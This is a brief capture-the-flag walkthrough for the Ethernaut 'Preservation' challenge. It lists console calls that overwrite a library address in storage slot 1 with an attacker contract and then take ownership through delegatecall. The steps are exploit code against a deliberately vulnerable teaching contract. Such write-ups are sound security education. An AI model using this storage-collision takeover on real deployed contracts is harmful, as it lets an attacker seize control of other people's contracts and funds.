# Preservation

Change timeZone1Library address which store in the memory slot 1 to attack contract address.

```javascript
await contract.setFirstTime(attackContractAddress)
```

Check the address - now the address should be attack contract.

```javascript
await contract.timeZone1Library()
```

call to execute attack contract

```javascript
await contract.setFirstTime("any")
```

check the owner - now the owner should be the attack contract deployer.

```javascript
await contract.owner()
```
